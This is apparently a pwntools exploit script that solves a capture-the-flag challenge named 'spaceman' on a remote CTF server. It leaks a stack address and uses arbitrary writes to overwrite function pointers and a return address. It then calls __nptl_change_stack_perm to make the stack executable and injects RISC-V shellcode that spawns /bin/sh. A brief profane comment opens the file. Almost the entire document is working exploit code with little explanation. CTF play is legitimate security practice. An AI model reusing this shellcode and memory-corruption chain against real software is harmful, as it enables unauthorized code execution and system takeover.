'''
lobob-rondo said: "leak stack, call __nptl_change_stack_perm to make stack executable and shellcode"

what a fucking solve
'''

from pwn import *
import struct
context.binary = elf = ELF("./spaceman")

# io = process("./run.sh")
# io = remote("127.0.0.1",1337)
io = remote("challs.pwnoh.io", 13372)

sc = b"A"*0x2e
sc = b"\x93\x08\xf0\x03\x13\x05\x00\x00\x93\x05\x81\xec\x13\x06\x00\x10s\x00\x00\x00"
# sc = b"A"*8
# sc += b"B"*8
# sc += b"C"*8
# sc += b"D"*8
io.sendlineafter(b'LOGIN: ',sc)
environ = 0x8f6a0
_read = 0x2474e

# arb write (write help function over echo 0x89028)
address = 0x89008#0x8a990
p = b"gang\x00aaa"
p += b"A"*8#p64(0x89028)
# p = p.ljust(0x10,b"A")
p += p64(address)
# p += b"C"*7
p += p64(_read)[:-1]
io.sendlineafter(b"COMMAND> ",p)
# sleep(1)
p2 = p64(0x89028)
p2 += p64(0x89028)[:-1]
io.sendlineafter(b"COMMAND> ", p2)
io.send(b"\xae\x07\x01")

# leak environ
p = b"gang\x00aaa"
# p += b"A"*8#p64(0x89028)
p = p.ljust(0x10,b"A")
p += p64(environ)
# p += b"C"*7
# p += p64(_read)[:-1]
io.sendlineafter(b"COMMAND> ",p)


io.sendlineafter(b"COMMAND> ",b"echo")
io.readuntil(b"COMMANDS:")
io.readline()
environ = u64(io.readline(False).ljust(8,b"\x00"))
print("environ",hex(environ))
sc_addr = environ-552
ret_addr = environ-144-96
pthread = 0x8a480

# reset sys_run
p = b"gang\x00aaa"
p += b"A"*8#p64(0x89028)
# p = p.ljust(0x10,b"A")
p += p64(0x5aa90) #help
# p += b"C"*7
p += p64(0x10854)[:-1] #sys_run
io.sendlineafter(b"COMMAND> ",p)

io.sendlineafter(b"COMMAND> ",b"help")
sc = p64(0x8aa00) # junk writable addr
sc += b"B"*8
sc += p64(0x4ef00)# make stack executable __nptl_change_stack_perm
sc += p64(0x8a480)
io.sendlineafter(b'LOGIN: ',sc)

# arb write (overwrite ret addr for gad1)
address = 0x89008#0x8a990
p = b"gang\x00aaa"
p += b"A"*8#p64(0x89028)
# p = p.ljust(0x10,b"A")
p += p64(address)
# p += b"C"*7
p += p64(_read)[:-1]
io.sendlineafter(b"COMMAND> ",p)
sleep(1)
p2 = p64(ret_addr)
p2 += p64(ret_addr)[:-1]
io.sendlineafter(b"COMMAND> ", p2)
io.sendline(p64(sc_addr)[:-1])

# sc_addr = 0x0040007ffc70

# p = b"gang\x00aaa"
# # p += b"A"*8#p64(0x89028)
# p = p.ljust(0x10,b"A")
# p += p64(sc_addr)
# # p += b"C"*7
# # p += p64(_read)[:-1]
# io.sendlineafter(b"COMMAND> ",p)
# sleep(1)
# context.log_level = 'debug'


# call gad1
gad_1 = 0x443b8

p = b"gang\x00aaa"
p += b"A"*8#p64(0x89028)
# p = p.ljust(0x10,b"A")
p += p64(0x5aa90) #help
# p += b"C"*7
p += p64(gad_1)[:-1]
io.sendlineafter(b"COMMAND> ",p)

io.sendline(b"dish")
addr = struct.unpack("f",p32(sc_addr&0xfffff000))[0]
io.sendlineafter(b"ENTER COORDINATES: ", b"0 "+str(addr).encode() )

io.sendline("engines")
addr_top = (sc_addr&0xffffffff00000000)>>2**5
io.sendlineafter(b"ENTER POWER (0-10): ",str(addr_top).encode())

io.sendline(b"help")


full_shellcode = b"/bin/sh\x00"
full_shellcode += b"\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x17\x05\x00\x00\x13\x85\x05\x00\x93\x05\x00\x00\x13\x06\x00\x00\x93\x08\xd0\rs\x00\x00\x00"
io.sendline(full_shellcode)

io.interactive()
